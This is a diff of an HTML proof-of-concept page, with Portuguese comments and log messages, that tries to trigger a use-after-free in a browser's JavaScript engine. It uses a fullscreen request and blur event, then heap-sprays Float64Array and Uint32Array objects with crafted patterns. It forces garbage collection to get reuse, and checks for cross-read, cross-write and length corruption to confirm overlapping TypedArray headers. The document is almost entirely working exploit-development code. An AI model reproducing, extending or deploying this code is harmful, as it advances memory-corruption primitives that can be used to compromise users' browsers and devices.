@@ -1,67 +1,51 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>UAF Phase-1 Proof — Backing Store 2</title>
+<title>Phase-1B — ArrayBufferView Header UAF Test</title>
 </head>
 <body>
 <pre id="log"></pre>
-<button onclick="run()">EXECUTAR TESTE FASE 1</button>
+<button onclick="run()">EXECUTAR TESTE HEADER UAF</button>
 
 <script>
-const log = (s) => document.getElementById('log').textContent += s + "\n";
+const log = s => document.getElementById("log").textContent += s + "\n";
 
-// Força pressão de heap para GC
 function forceGC() {
-    let trash = [];
-    for (let i = 0; i < 20000; i++) {
-        trash.push(new ArrayBuffer(0x1000));
+    let tmp = [];
+    for (let i = 0; i < 30000; i++) {
+        tmp.push(new Uint8Array(0x100));
     }
-    trash = null;
-}
-
-// Cria muitos ArrayBuffers com sentinela conhecida
-function sprayBuffers(count, size, sentinel) {
-    const bufs = [];
-    for (let i = 0; i < count; i++) {
-        const ab = new ArrayBuffer(size);
-        const dv = new DataView(ab);
-        dv.setUint32(0, sentinel, true);
-        bufs.push({ ab, dv });
-    }
-    return bufs;
+    tmp = null;
 }
 
 function run() {
-    log("=== FASE 1: PROVA DE UAF REAL (BACKING STORE) ===");
+    log("=== FASE 1B: TESTE DE UAF DO HEADER (ArrayBufferView) ===");
     log("Prepare-se: aperte OPTIONS quando solicitado.");
 
-    const controllers = [];
     const PATTERN = 2.121995791e-314;
+    const controllers = [];
 
-    // Controladores TypedArray
     for (let i = 0; i < 6000; i++) {
-        const ta = new Float64Array(8);
+        let ta = new Float64Array(8);
         ta[0] = i;
         controllers.push(ta);
     }
 
-    // Fullscreen para gatilhar blur/UAF (mantém sua técnica)
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+    if (document.documentElement.webkitRequestFullscreen)
+        document.documentElement.webkitRequestFullscreen();
 
     window.onblur = function () {
-        log("[*] UAF window aberta.");
+        log("[*] Janela de UAF aberta.");
 
-        // Spray que costuma ocupar o mesmo slab
         let spray = [];
-        for (let i = 0; i < 10000; i++) {
-            const t = new Float64Array(10);
+        for (let i = 0; i < 12000; i++) {
+            let t = new Float64Array(8);
             t.fill(PATTERN);
             spray.push(t);
         }
 
-        // Encontrar TypedArray corrompido
         let corrupted = null;
         for (let i = 0; i < controllers.length; i++) {
             if (controllers[i][0] === PATTERN) {
@@ -71,67 +55,70 @@ function run() {
         }
 
         if (!corrupted) {
-            log("[-] UAF NÃO confirmado.");
+            log("[-] UAF não confirmado.");
             return;
         }
 
         log("[+] UAF CONFIRMADO (TypedArray).");
 
-        // Captura do buffer potencialmente pós-free
         const buf = corrupted.buffer;
         const dv = new DataView(buf);
-        log("[*] Capturado corrupted.buffer e DataView.");
 
-        // Escrita inicial local
-        dv.setUint32(0, 0x11111111, true);
-        log("[*] Write local: 0x11111111");
+        dv.setUint32(0, 0xAAAAAAAA, true);
+        log("[*] Escrita inicial via DataView: 0xAAAAAAAA");
 
-        // Força GC e reuso
+        // Destrói referências fortes
+        corrupted = null;
+        controllers.length = 0;
+        spray = null;
+
         forceGC();
         log("[*] GC forçado.");
 
-        // Spray de ArrayBuffers com sentinela distinta
-        const SENTINEL_A = 0x41414141;
-        const SENTINEL_B = 0x42424242;
-        const sprayedA = sprayBuffers(4000, buf.byteLength, SENTINEL_A);
-        const sprayedB = sprayBuffers(4000, buf.byteLength, SENTINEL_B);
-        log("[*] Spray de ArrayBuffers com sentinelas A/B concluído.");
+        // Criar novos TypedArrays após GC
+        let victims = [];
+        for (let i = 0; i < 5000; i++) {
+            victims.push(new Uint32Array(8));
+        }
 
-        // Verificação 1: leitura inesperada
-        const r0 = dv.getUint32(0, true);
-        log("[*] Readback pós-GC: 0x" + r0.toString(16));
+        log("[*] Novos TypedArrays criados.");
 
-        if (r0 === SENTINEL_A || r0 === SENTINEL_B) {
-            log("!!! SUCESSO: OVERLAP REAL DETECTADO (sentinela vista no DataView) !!!");
+        // Teste 1 — leitura cruzada inesperada
+        for (let i = 0; i < victims.length; i++) {
+            try {
+                if (victims[i][0] === 0xAAAAAAAA) {
+                    log("!!! SUCESSO: HEADER REUTILIZADO (leitura cruzada detectada)");
+                    log("    Victim index: " + i);
+                    return;
+                }
+            } catch {}
+        }
+
+        // Teste 2 — escrita no novo TypedArray refletida no DataView antigo
+        victims[0][0] = 0xDEADBEEF;
+        const r = dv.getUint32(0, true);
+
+        log("[*] Escrita victims[0][0]=0xDEADBEEF");
+        log("[*] Readback DataView antigo: 0x" + r.toString(16));
+
+        if (r === 0xDEADBEEF) {
+            log("!!! SUCESSO: OVERLAP DE HEADER CONFIRMADO (escrita cruzada)");
             return;
         }
 
-        // Verificação 2: escrita cruzada
-        sprayedA[0].dv.setUint32(0, 0xDEADBEEF, true);
-        const r1 = dv.getUint32(0, true);
-        log("[*] Após escrever em sprayedA[0]: 0x" + r1.toString(16));
-
-        if (r1 === 0xDEADBEEF) {
-            log("!!! SUCESSO: ESCRITA CRUZADA (UAF REAL) !!!");
-            return;
+        // Teste 3 — inconsistência estrutural
+        for (let i = 0; i < victims.length; i++) {
+            if (victims[i].length !== 8) {
+                log("!!! SUCESSO: LENGTH CORROMPIDO (victim " + i + ")");
+                log("    length=" + victims[i].length);
+                return;
+            }
         }
 
-        // Verificação 3: instabilidade sem escrita
-        forceGC();
-        const r2 = dv.getUint32(0, true);
-        log("[*] Readback após novo GC (sem escrita): 0x" + r2.toString(16));
-
-        if (r2 !== r1) {
-            log("!!! SUCESSO: INSTABILIDADE DE BACKING STORE (pós-free) !!!");
-            return;
-        }
-
-        log("[-] Nenhuma evidência de UAF REAL detectada.");
-        log("[-] Conclusão: backing store ainda válido OU não reaproveitado.");
+        log("[-] Nenhuma evidência de UAF de header detectada.");
+        log("[-] Conclusão: headers não foram reciclados.");
     };
-}
+};
 </script>
 </body>
 </html>
-
-
